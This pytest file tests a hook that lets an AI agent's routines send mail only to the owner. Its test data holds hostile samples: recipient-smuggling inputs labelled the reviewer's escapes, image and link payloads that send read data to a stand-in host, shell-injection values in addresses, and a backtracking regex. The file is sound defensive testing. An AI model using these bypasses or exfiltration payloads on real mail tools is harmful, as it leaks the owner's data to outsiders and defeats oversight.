"""The send guard: a routine sends mail only to the person. A PreToolUse hook on each send tool of the
routine's grant refuses (exit 2) any call whose recipients are not exactly the person, and anything it
cannot read. Tested as a function, as a process, and as the command line the routine's settings carry,
through a shell, in a folder with spaces and accents."""
import json
import os
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

import routine
import send_guard

ADA = "ada@lanternworks.example"
BEN = "ben@lanternworks.example"


def test_the_send_guard_lets_mail_go_only_to_the_person():
    assert send_guard.allowed({"to": ["ada@lanternworks.example"]}, "Ada@LanternWorks.example")
    assert not send_guard.allowed({"to": ["ada@lanternworks.example"], "cc": "ben@lanternworks.example"}, "ada@lanternworks.example")
    assert not send_guard.allowed({}, "ada@lanternworks.example")


def test_every_recipient_field_and_shape_is_read():
    assert send_guard.recipients({"to": [ADA], "cc": [BEN], "bcc": "x@y.example", "recipients": ["z@y.example"]}) == [
        ADA, BEN, "x@y.example", "z@y.example"]
    assert send_guard.recipients({"to": f"Ada Okafor <{ADA}>, {BEN}; c@d.example"}) == [ADA, BEN, "c@d.example"]
    assert send_guard.recipients({"to": [{"email": ADA}, {"address": BEN}, {"name": "C", "emailAddress": {"address": "c@d.example"}}]}) == [
        ADA, BEN, "c@d.example"]
    graph = {"message": {"subject": "x", "toRecipients": [{"emailAddress": {"name": "Ada", "address": ADA}}],
                         "ccRecipients": [{"emailAddress": {"address": BEN}}]}}
    assert send_guard.recipients(graph) == [ADA, BEN]   # Outlook's shape, a level down
    assert send_guard.recipients({"headers": [{"name": "To", "value": ADA}, {"name": "Subject", "value": "hi"}]}) == [ADA]


@pytest.mark.parametrize("tool_input", [
    {"to": [ADA, BEN]},                                    # one stranger among the recipients
    {"to": [ADA], "bcc": [BEN]},                           # a blind copy
    {"to": [ADA], "cc": [{"email": BEN}]},
    {"to": [ADA], "replyTo": BEN},                         # the answers would go elsewhere
    {"message": {"toRecipients": [{"emailAddress": {"address": ADA}}], "bccRecipients": [{"emailAddress": {"address": BEN}}]}},
    {"to": f"{ADA}, {BEN}"},                               # a comma inside one string
    {"to": f"{ADA};{BEN}"},
    {"to": f"Ada <{ADA}> {BEN}"},                          # an address hidden beside a name
    {"to": f'"{BEN}" <{ADA}>'},                            # an address in the name: two @, one address read
    {"to": f"{ADA}\n{BEN}"},
    {"to": [f"{ADA} {BEN}"]},
    {"to": ["ada"]},                                       # a name the mailbox would resolve to someone
    {"to": ["ada＠lanternworks.example"]},             # a look-alike at sign
    {"to": ["аda@lanternworks.example"]},             # a Cyrillic a
    {"to": [ADA + "."]},
    {"to": [7]}, {"to": [None]}, {"to": 7}, {"to": True}, {"to": [[ADA]]}, {"to": [{"name": "Ada"}]},
    {"to": [{"email": 7}]},
    {"to": []}, {"to": ""}, {"to": None}, {"to": ",;"},
    {"draftId": "r-123"},                                  # a stored draft is sent as it is: its recipients are not here
    {"draftId": "r-123", "to": [ADA]},                     # and the recipient fields are then ignored
    {"draft": {"to": [ADA]}, "to": [ADA]},
    {"messageId": "m-1", "to": [ADA]},                     # an existing message sent or answered: not checkable
    {"to": [ADA], "replyAll": True},                       # reply-all keeps the earlier recipients
    {"to": [ADA], "raw": "VG86IGJlbkBsYW50ZXJud29ya3MuZXhhbXBsZQ=="},   # a whole message with its own To: line
    {"to": [ADA], "headers": {"Bcc": BEN}},
    {"to": [ADA], "headers": [{"name": "Cc", "value": BEN}]},
    {"to": [ADA], "headers": [{"name": "Cc", "value": 7}]},
    {"subject": "hello", "body": f"write to {ADA}"},     # an address in the body is no recipient
])
def test_anything_but_mail_to_the_person_alone_is_refused(tool_input):
    assert not send_guard.allowed(tool_input, ADA), tool_input


@pytest.mark.parametrize("tool_input", [
    {"to": [ADA]}, {"to": ADA}, {"to": [ADA.upper()]}, {"to": f"Ada Okafor <{ADA}>"}, {"to": [ADA], "cc": [], "bcc": None},
    {"to": [ADA], "cc": [ADA]}, {"to": [{"email": ADA}]}, {"recipients": [ADA]}, {"to": [], "cc": [ADA]},
    {"to": [ADA], "subject": "Your morning", "body": "Two things need you.", "replyThreadId": "t-1", "includeSignature": False},
    {"to": [ADA], "body": f"Reply to {ADA}."},             # the person named in the text, a sentence's full stop after
    {"toList": [ADA]},                                     # a field the guard does not know, holding the person alone
    {"to": [ADA], "replyToMessageId": "m-1"},              # threading under a message adds no recipient
    {"to": [ADA], "replyAll": False},
    {"to": [ADA], "attachments": [{"filename": "a.pdf", "content": "AA==", "id": "x"}]},
])
def test_mail_to_the_person_alone_goes_through(tool_input):
    assert send_guard.allowed(tool_input, ADA), tool_input


@pytest.mark.parametrize("person", ["", "ada", f"{ADA}, {BEN}", f"{ADA} {BEN}", None, 7, "ada@", "@lanternworks.example"])
def test_without_one_address_for_the_person_nothing_is_sent(person):
    assert not send_guard.allowed({"to": [ADA]}, person)


def test_a_person_given_with_a_name_is_their_address():
    assert send_guard.allowed({"to": [ADA]}, f"Ada Okafor <{ADA}>")


@pytest.mark.parametrize("odd", [None, [], "text", 7, {"to": {"nested": {"deeper": ADA}}}])
def test_a_request_that_is_not_a_mapping_or_unreadable_is_refused(odd):
    assert not send_guard.allowed(odd, ADA)


def test_a_request_nested_too_deeply_is_refused():
    deep = {"to": [ADA]}
    for _ in range(200):
        deep = {"message": deep}
    assert not send_guard.allowed(deep, ADA)


# ----- as a process --------------------------------------------------------------------------------
def hook_event(tool_input, tool="mcp__claude_ai_Gmail__send_message") -> bytes:
    return json.dumps({"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input}).encode("utf-8")


def test_the_process_exits_two_with_why_and_zero_to_allow(capsys):
    assert send_guard.main([ADA], hook_event({"to": [ADA]})) == 0
    assert send_guard.main([ADA], hook_event({"to": [BEN]})) == 2
    err = capsys.readouterr().err
    assert f"routines send mail only to {ADA}" in err and BEN not in err


@pytest.mark.parametrize("argv, raw", [([ADA], b"not json"), ([ADA], b""), ([ADA], b"\xff\xfe"), ([], hook_event({"to": [ADA]})),
                                       ([ADA], b"[]"), ([ADA], json.dumps({"tool_input": None}).encode()),
                                       (["not an address"], hook_event({"to": ["not an address"]}))])
def test_the_process_fails_closed(argv, raw):
    assert send_guard.main(argv, raw) == 2


def test_the_guard_needs_nothing_but_the_standard_library():
    text = Path(send_guard.__file__).read_text(encoding="utf-8")
    imports = {line.split()[1].split(".")[0] for line in text.splitlines() if line.startswith(("import ", "from "))}
    assert imports <= {"__future__", "faulthandler", "base64", "binascii", "html", "json", "os", "re", "sys", "threading"}


# ----- the command the routine's settings carry -----------------------------------------------------
def accented_copy(tmp_path) -> Path:
    """The guard script in a folder whose name has a space, accents and an ampersand."""
    folder = tmp_path / "Zoë Müller & co" / "tools"
    folder.mkdir(parents=True)
    return Path(shutil.copy(send_guard.__file__, folder / "send_guard.py"))


def shells() -> list:
    """The shells a hook command is run with: the system's own, and Git Bash or sh where there is one."""
    found = [None]
    bash = routine.hook_shell()
    if bash:
        found.append(bash)
    return found


def run_hook(command: str, payload: bytes, shell) -> int:
    if shell is None:
        return subprocess.run(command, shell=True, input=payload, capture_output=True).returncode
    return subprocess.run([*shell, command], input=payload, capture_output=True).returncode


def test_the_hook_command_is_python_isolated_and_every_word_quoted(tmp_path):
    script = accented_copy(tmp_path)
    command = routine.send_guard_command(ADA, script=script)
    python = Path(sys.executable).as_posix()
    assert command == f'"{python}" -I "{script.as_posix()}" "{ADA}" || exit 2'
    assert shlex.split(command) == [python, "-I", script.as_posix(), ADA, "||", "exit", "2"]
    assert routine.SEND_GUARD.name == "send_guard.py" and routine.SEND_GUARD.is_file()


def test_the_hook_command_runs_through_a_shell_in_a_folder_with_spaces_and_accents(tmp_path):
    command = routine.send_guard_command(ADA, script=accented_copy(tmp_path))
    for shell in shells():
        assert run_hook(command, hook_event({"to": [ADA]}), shell) == 0, shell
        assert run_hook(command, hook_event({"to": [BEN]}), shell) == 2, shell


def test_a_guard_that_cannot_start_blocks_instead_of_failing_open(tmp_path):
    payload = hook_event({"to": [ADA]})
    for command in (routine.send_guard_command(ADA, python=str(tmp_path / "no python here")),
                    routine.send_guard_command(ADA, script=tmp_path / "gone" / "send_guard.py")):
        assert command.endswith(" || exit 2")
        for shell in shells():
            assert run_hook(command, payload, shell) == 2, (command, shell)


@pytest.mark.parametrize("person", ['ada"@x.example', "ada$HOME@x.example", "ada`id`@x.example", "ada%PATH%@x.example",
                                    "ada!@x.example", "ada\\@x.example", "ada@x.example\nb@y.example", "ada", "", "a b@x.example"])
def test_an_address_the_command_cannot_carry_is_refused_not_guessed_at(person):
    with pytest.raises(ValueError):
        routine.send_guard_command(person)


def test_a_path_the_command_cannot_quote_is_refused(tmp_path):
    for bad in ('say "hi"', "cash$HOME", "50%off", "bang!"):
        with pytest.raises(ValueError):
            routine.send_guard_command(ADA, python=str(tmp_path / bad / "python"))


# ----- what the guard does not know is refused: every address anywhere must be the person (Ruling R30) ----
def b64(text: str) -> str:
    import base64
    return base64.b64encode(text.encode("utf-8")).decode("ascii")


@pytest.mark.parametrize("tool_input", [
    {"to": [ADA], "cc_emails": [BEN]},                     # the reviewer's escapes: fields the guard does not know
    {"to": [ADA], "rawMessage": f"To: {BEN}\r\n\r\nhi"},
    {"to": [ADA], "rawMessage": b64(f"To: {ADA}\r\n\r\nhi")},   # a whole message, even one to the person
    {"to": [ADA], "ccList": [BEN]},
    {"toList": [BEN]},
    {"to": [ADA], "toList": [ADA, BEN]},
    {"to": [ADA], "redirectTo": BEN},
    {"to": [ADA], "headers": {"Resent-To": BEN}},
    {"to": [ADA], "headers": [{"name": "Resent-To", "value": BEN}]},
    {"to": [ADA], "headers": {"X-Forward-To": "ben"}},     # a header naming a recipient, without an address
    {"to": [ADA], "toIds": ["u-123"]},                     # recipients by id: nothing to hold them to
    {"to": [ADA], "body": f"Please forward this to {BEN}."},   # the body mentions another address
    {"to": [ADA], "htmlBody": f'<a href="mailto:{BEN}">write</a>'},
    {"to": [ADA], "subject": f"for {BEN}"},
    {"to": [ADA], "message": f"From: {ADA}\r\nTo: {BEN}\r\n\r\nhi"},   # a message as plain text
    {"to": [ADA], "options": {"deliver": {"also": [{"who": BEN}]}}},   # nested anywhere
    {"to": [ADA], BEN: True},                              # an address as a field's name
    {"to": [ADA], "payload": b64(f"From: {ADA}\r\nTo: {BEN}\r\n\r\nhi")},   # base64 that holds another address
    {"to": [ADA], "body": "write to ben\uff20lanternworks.example"},   # look-alike at signs in the text
    {"to": [ADA], "body": "write to ben%40lanternworks.example"},
    {"to": [ADA], "body": "write to ben&#64;lanternworks.example"},
    {"to": [ADA], "body": "ask @ben"},
    {"to": [ADA], "toList": [ADA + "\u200b"]},             # a zero-width space after the person
    {"to": [ADA], "cc_emails": ["ada@lanternwor\u212as.example"]},   # a Kelvin sign: lower() makes it a k
    {"to": [ADA], "cc_emails": ["\u0430da@lanternworks.example"]},  # a Cyrillic a
    {"subject": "hi", "body": "no address anywhere"},      # a send whose input holds no address at all
    {"channel": "C123", "text": "hi"},
    {"subject": "hello", "body": f"write to {ADA}"},       # the person only in the text: no recipient named
])
def test_the_guard_fails_closed_on_what_it_does_not_know(tool_input):
    assert not send_guard.allowed(tool_input, ADA), tool_input


def test_a_rendered_notice_to_the_person_goes_through():
    """What the routines send: a notice rendered by owner_email, from the person to themselves."""
    import owner_email
    notice = {"kind": "briefing", "title": "Your morning", "summary": "Two things need you today.",
              "stats": [{"count": 2, "label": "need you"}], "sender": "morning-view"}
    payload = owner_email.render(notice, [ADA], today="2026-10-25")
    assert send_guard.allowed(payload, ADA)
    assert not send_guard.allowed({**payload, "body": payload["body"] + f"\n{BEN}"}, ADA)


@pytest.mark.parametrize("tool_input", [{"to": [ADA], "cc_emails": [BEN]}, {"to": [ADA], "rawMessage": f"To: {BEN}\r\n\r\nhi"}])
def test_the_escapes_are_refused_by_the_process_through_a_shell(tmp_path, tool_input):
    command = routine.send_guard_command(ADA, script=accented_copy(tmp_path))
    for shell in shells():
        assert run_hook(command, hook_event(tool_input), shell) == 2, shell


# ----- the final review (Ruling R45): recipients first, a size cap, a scan in step with the text, plain mail only ----
import datetime as dt   # noqa: E402
import threading   # noqa: E402
import time   # noqa: E402
import types   # noqa: E402

import morning_view   # noqa: E402
import owner_email   # noqa: E402
import pages   # noqa: E402
import spaceyaml   # noqa: E402
from conftest import NOW, make_space, write_page   # noqa: E402


def test_a_stranger_in_a_recipient_field_is_refused_before_any_text_is_read(monkeypatch):
    """C-1: the recipients decide first; the text of a mail to someone else, however long, is never read."""
    monkeypatch.setattr(send_guard, "mentioned", lambda tool_input: pytest.fail("the text was read"))
    assert not send_guard.allowed({"to": [BEN], "subject": "hi", "body": "a" * 60_000}, ADA)   # under the size cap
    assert not send_guard.allowed({"to": [ADA], "cc": f"Ben <{BEN}>", "body": b64("a" * 45_000)}, ADA)


def test_a_call_larger_than_64_kb_is_refused_with_a_plain_reason(capsys):
    """C-1: the briefing and the owner notices are a few KB; anything past 64 KB is not read at all."""
    assert send_guard.MAX_INPUT == 64 * 1024
    small = {"to": [ADA], "subject": "Your morning", "body": "x " * 30_000}   # 60 KB
    large = {"to": [ADA], "subject": "Your morning", "body": "x " * 34_000}   # 68 KB
    assert send_guard.allowed(small, ADA) and not send_guard.allowed(large, ADA)
    assert send_guard.main([ADA], hook_event(large)) == 2
    err = capsys.readouterr().err
    assert f"routines send mail only to {ADA}" in err and "64 KB" in err


@pytest.mark.parametrize("tool_input", [
    {"to": [ADA], "body": b64("a" * 45_000)},                     # 60 KB of base64 that decodes to one long word
    {"to": [ADA], "body": b64(("a" * 63 + "@") * 700)},           # at signs every 64 letters, in base64
    {"to": [ADA], "body": "a" * 30_000 + "@" + "b" * 30_000},
    {"to": [ADA], "body": ("a" * 63 + "@") * 900},
    {"to": [ADA], "body": "a@" + "b-" * 30_000},
    {"to": [ADA], "body": "a@" + ("b" * 9 + ".") * 6_000},
    {"to": "a" + " " * 60_000 + "b"},                             # between a name and its angle bracket
    {"to": [ADA], "htmlBody": "<" * 60_000}, {"to": [ADA], "htmlBody": "&#" * 30_000},
    {"to": [ADA], "htmlBody": "\\" * 60_000}, {"to": [ADA], "htmlBody": "/" * 60_000},
    {"to": [ADA], "htmlBody": "http-equiv=" + " " * 60_000},           # NB-1: 64k spaces took 32 s
    {"to": [ADA], "htmlBody": "http-equiv" + " " * 30_000 + "=" + " " * 30_000 + "x"},
    {"to": [ADA], "htmlBody": "<object" + "\n" * 60_000}, {"to": [ADA], "htmlBody": ("src" + " " * 7) * 6_000},
])
def test_the_text_is_read_in_time_that_grows_with_it_and_no_faster(tool_input):
    """C-1: a long run of address letters took time that grew with the square of its length (40 KB: 1.5 s,
    182 KB: 36 s, past the hook's minute at about 250 KB); each text is now read once, so any call under the
    size cap is decided in well under a second."""
    started = time.perf_counter()
    send_guard.allowed(tool_input, ADA)
    assert time.perf_counter() - started < 1


def test_a_megabyte_is_decided_in_well_under_a_second_by_the_process():
    """C-1, as Claude Code starts the hook: a 1 MB body of base64 letters, to the person or to a stranger."""
    blob = b64("a" * 750_000)
    for tool_input in ({"to": [ADA], "body": blob}, {"to": "stranger@x.example", "body": blob}):
        started = time.perf_counter()
        got = subprocess.run([sys.executable, "-I", send_guard.__file__, ADA], input=hook_event(tool_input),
                             capture_output=True, timeout=15)
        assert got.returncode == 2 and time.perf_counter() - started < 2   # the interpreter's own start included


def test_only_to_cc_bcc_and_recipient_fields_say_whom_a_mail_goes_to():
    """Minor 7 (R35 N-1): `from`, `sender` and `replyTo` are read as strictly, but they name who sends the mail or
    where answers go: a call whose real recipient sits in a field the guard cannot read (an id) is refused."""
    for tool_input in ({"from": ADA, "userId": "u-123", "body": "hi"},
                       {"sender": ADA, "conversationId": "c-1", "text": "hi"},
                       {"from": {"emailAddress": {"address": ADA}}, "chatId": "c-9", "body": "hi"},
                       {"replyTo": ADA, "userIds": ["u-1"], "body": "hi"},
                       {"headers": {"From": ADA}, "threadId": "t-1", "body": "hi"},
                       {"email": ADA, "body": "hi"}):                  # an address in a field that says nothing of whom
        assert not send_guard.allowed(tool_input, ADA), tool_input
    for tool_input in ({"to": [ADA], "from": ADA}, {"to": [ADA], "sender": f"Ada <{ADA}>", "replyTo": ADA},
                       {"message": {"toRecipients": [{"emailAddress": {"address": ADA}}],
                                    "from": {"emailAddress": {"address": ADA}}}}):
        assert send_guard.allowed(tool_input, ADA), tool_input
    for tool_input in ({"to": [ADA], "from": BEN}, {"to": [ADA], "sender": BEN}, {"to": [ADA], "headers": {"From": BEN}}):
        assert not send_guard.allowed(tool_input, ADA), tool_input


# What a mail client fetches by itself when the mail is opened, and a link out: none of it in a routine's mail (I-7).
LOADS = ['<img src="https://x.example/p.png?d=secret">', "<IMG SRC=https://x.example/p.png>", "<img/src=//x.example/p>",
         '<picture><source srcset="https://x.example/a.png"></picture>', '<td background="https://x.example/b.png">',
         '<div style="background:url(https://x.example/c.png)">', "<div style=\"background-image: URL( '//x.example/c' )\">",
         '<link rel="stylesheet" href="https://x.example/s.css">', '<iframe src="https://x.example/f"></iframe>',
         '<object data="https://x.example/o"></object>', '<embed src="https://x.example/e">',
         '<meta http-equiv="refresh" content="0;url=https://x.example/r">', '<svg><image href="https://x.example/i.svg"/></svg>',
         '<video poster="https://x.example/v.png"></video>',
         "Read more at https://x.example/?d=secret", "http://x.example", "HTTPS://X.EXAMPLE/A", '<a href="//x.example/y">here</a>',
         '<a href="https&#58;//x.example">here</a>', '<a href="https&colon;&sol;&sol;x.example">here</a>',
         '<div style="background:\\75 rl(\\2f\\2fx.example/c.png)">', "https:\\\\x.example\\a", "https:/\n/x.example/a",
         '<object\ndata="//x.example/o"></object>', "<OBJECT\tDATA=//x.example/o>",             # NB-2: a break parts the tag
         "Read it at\nwww.x.example/a", '<meta http-equiv="Content-Type" content="text/html">']   # any http-equiv


@pytest.mark.parametrize("field", ["htmlBody", "body", "subject", "bodyHtml", "text"])
@pytest.mark.parametrize("content", LOADS)
def test_content_that_loads_by_itself_or_links_out_is_refused_in_every_text(field, content):
    """I-7: a record a routine read can ask for a remote picture whose address carries what it read; the person's
    mail client would fetch it on opening the mail. The routines' mail carries no address of a server at all:
    none of the senders they run needs one."""
    assert not send_guard.allowed({"to": [ADA], field: content}, ADA), (field, content)


@pytest.mark.parametrize("tool_input", [
    {"message": {"subject": "x", "toRecipients": [{"emailAddress": {"address": ADA}}],
                 "body": {"contentType": "HTML", "content": '<p>Hi</p><img src="https://x.example/p.png">'}}},
    {"to": [ADA], "attachments": [{"filename": "a.html", "content": b64('<html><img src="https://x.example/p.png"></html>')}]},
    {"to": [ADA], "body": "hi", "extra": {"note": "see https://x.example"}},   # a field the guard does not know
])
def test_what_loads_by_itself_is_refused_anywhere_in_the_call(tool_input):
    assert not send_guard.allowed(tool_input, ADA)


def test_the_check_for_what_loads_by_itself_knows_every_form_and_leaves_plain_text_alone():
    for text in [*LOADS, '<style>@import "s.css";</style>', "<IFRAME srcdoc=x>", "<embed type=x>"]:
        assert send_guard.loads_from_elsewhere(text), text
    template = Path(owner_email.TEMPLATE).read_text(encoding="utf-8")
    for text in (template, "Two things need you today.", "and/or // a note", "At 10:30 the sync ran.", "50% done",
                 "C:/Users is no link", "Morning briefing: 2 items need you", "&#847;&nbsp;" * 100):
        assert not send_guard.loads_from_elsewhere(text), text


def test_the_process_says_why_plain_mail_only(capsys):
    assert send_guard.main([ADA], hook_event({"to": [ADA], "htmlBody": '<img src="https://x.example/p.png">'})) == 2
    err = capsys.readouterr().err
    assert f"routines send mail only to {ADA}" in err and "x.example" not in err and "link" in err


def briefing_space(tmp_path) -> Path:
    """Ada's workspace on a morning with an item leaving, a candidate and a health line (as test_morning_view's)."""
    root = make_space(tmp_path / "ada", owner_email=ADA)
    write_page(root, "_inbound/candidates/harbor.md", id="p-00000101", type="entity", title="Harbor", subject="harbor",
               kind="projects", target="knowledge/projects/harbor/harbor.md", evidence=["m-1"],
               body="Harbor goes live on 3 November.\n")
    write_page(root, "_outbound/queue/p-00000201.md", id="p-00000201", type="source", title="Go-live date",
               **{"class": "window"}, destination="harbor", subject="harbor",
               stage_after=pages.iso(NOW + dt.timedelta(hours=10)), listed=False, from_space="ada", kind="mail",
               evidence=["m-1"], body="Go-live date body.\n")
    write_page(root, "live/health.md", id="p-00000002", type="snapshot", title="Health",
               body="# Health\n\nada: 3 runs in the last day, 1200 tokens, 1 open question\n")
    return root


def shipped_payloads(tmp_path) -> list:
    """What the routines really send: the morning view's payload (shadow and not, a quiet day), and the owner notices
    the shipped tools queue (sweep's security notice, request's answer, classify's planned space)."""
    import classify
    import request
    import sweep
    root = briefing_space(tmp_path)
    found = []
    for shadow in (False, True):
        report = morning_view.run(root, "Ada Okafor", now=NOW, shadow=shadow)
        found.append(json.loads(Path(report.payload_path).read_text(encoding="utf-8")))
    quiet = make_space(tmp_path / "ben", owner="Ben Liu", owner_email=ADA)
    found.append(json.loads(Path(morning_view.run(quiet, "Ben Liu", now=NOW).payload_path).read_text(encoding="utf-8")))
    space = spaceyaml.load(root)
    sweep._security_notice(root, space, {"kind": "mail", "at": "2026-10-11T08:00:00Z", "id": "r-1"})
    request._notice(root, space, {"to": "harbor", "id": "q-1"}, "")
    reg = types.SimpleNamespace(get=lambda sid: types.SimpleNamespace(title="Harbor"))
    classify._plan_mint(root, space, reg, "harbor", "harbor", ["Ada Okafor", "Ben Liu"], NOW)
    notices = [json.loads(p.read_text(encoding="utf-8"))["payload"] for p in owner_email.pending(root)]
    assert len(notices) == 3
    return found + notices


def test_what_the_routines_really_send_passes_and_the_same_with_a_picture_or_a_link_does_not(tmp_path):
    """I-7: the morning view's real payload and the shipped owner notices hold no link at all, so plain links are
    refused too; a remote picture or a link added to any of them is refused."""
    for payload in shipped_payloads(tmp_path):
        assert payload["to"] == [ADA] and len(json.dumps(payload)) < send_guard.MAX_INPUT / 4
        assert send_guard.allowed(payload, ADA), payload["subject"]
        pixel = payload["htmlBody"].replace("</body>", '<img src="https://x.example/p.png?d=harbor" width="1"></body>')
        assert pixel != payload["htmlBody"] and not send_guard.allowed({**payload, "htmlBody": pixel}, ADA)
        assert not send_guard.allowed({**payload, "body": payload["body"] + "\nMore: https://x.example/?d=1"}, ADA)


# ----- the guard bounds its own time (dry run A: a hook Claude Code cuts off at its timeout lets the call through) -----
def test_the_guard_gives_up_with_a_refusal_once_its_own_time_is_up(monkeypatch, capsys):
    """A guard that hangs (a cold disk, a scan of its file) ends itself with exit 2 long before the hook's timeout."""
    assert send_guard.LIMIT_SECONDS == 10 and routine.GUARD_TIMEOUT >= 3 * send_guard.LIMIT_SECONDS
    exits, done = [], threading.Event()
    monkeypatch.setattr(send_guard.os, "_exit", lambda code: (exits.append(code), done.set()))
    monkeypatch.setattr(send_guard, "LIMIT_SECONDS", 0.05)
    send_guard.arm(f"routines send mail only to {ADA}")
    assert done.wait(10) and exits == [2]
    assert f"routines send mail only to {ADA}" in capsys.readouterr().err


def test_a_guard_process_that_hangs_exits_two_by_itself():
    tools = Path(send_guard.__file__).parent
    code = ("import sys, threading; sys.path.insert(0, sys.argv[1]); import send_guard as g; g.LIMIT_SECONDS = 0.2; "
            "g.main = lambda argv, raw: threading.Event().wait(); sys.argv = ['send_guard.py', sys.argv[2]]; sys.exit(g.run())")
    got = subprocess.run([sys.executable, "-I", "-c", code, str(tools), ADA], input=hook_event({"to": [ADA]}),
                         capture_output=True, timeout=30)
    assert got.returncode == 2 and b"routines send mail only to" in got.stderr


def test_a_guard_held_inside_one_long_call_is_ended_all_the_same():
    """NB-1: the timer cannot run while one call holds the interpreter (a regular expression); faulthandler ends
    the process with exit 1 two seconds after the limit, and the hook command's `|| exit 2` makes that a block."""
    tools = Path(send_guard.__file__).parent
    code = ("import re, sys; sys.path.insert(0, sys.argv[1]); import send_guard as g; g.LIMIT_SECONDS = 0.2; "
            "g.main = lambda argv, raw: re.match('(a+)+$', 'a' * 40 + '!'); sys.argv = ['send_guard.py', sys.argv[2]]; "
            "sys.exit(g.run())")
    started = time.perf_counter()
    got = subprocess.run([sys.executable, "-I", "-c", code, str(tools), ADA], input=hook_event({"to": [ADA]}),
                         capture_output=True, timeout=60)
    assert got.returncode == 1 and time.perf_counter() - started < 10
    assert routine.send_guard_command(ADA).endswith(" || exit 2")
    shell = routine.hook_shell()
    if shell is not None:   # in the hook's own shell, that 1 is a 2
        python = Path(sys.executable).as_posix()
        ended = subprocess.run([*shell, f'"{python}" -c "import sys; sys.exit(1)" || exit 2'], capture_output=True, timeout=60)
        assert ended.returncode == 2
